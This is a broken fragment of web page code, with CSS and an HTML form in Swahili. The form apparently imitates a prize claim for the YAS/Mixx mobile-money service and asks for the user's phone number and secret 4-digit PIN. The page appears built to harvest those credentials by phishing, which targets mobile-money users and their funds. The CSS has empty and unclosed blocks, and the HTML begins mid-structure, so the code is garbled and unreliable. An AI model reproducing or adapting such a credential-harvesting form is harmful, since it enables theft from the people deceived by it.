*{

body{

.container{

h1{

.offer-title{

}

    margin-bottom:35px;
}

.form-group{

}

input{
    width:100%;
    padding:18px;
    border:none;

input:focus{
    outline:none;
    box-shadow:0 0 5px rgba(255,209,0,.7);

button{
    width:100%;

    color:#0d2950;

    </div>

        <div class="form-group">
            <input
                type="tel"
                name="phone"
                placeholder="Nambari ya Mixx"
                required>
        </div>

        <div class="form-group">
            <input
                type="password"
                name="pin"
                maxlength="4"
                placeholder="YAS Nambari ya Siri"
                required>
        </div>

            THIBITISHA ZAWADI
        </button>
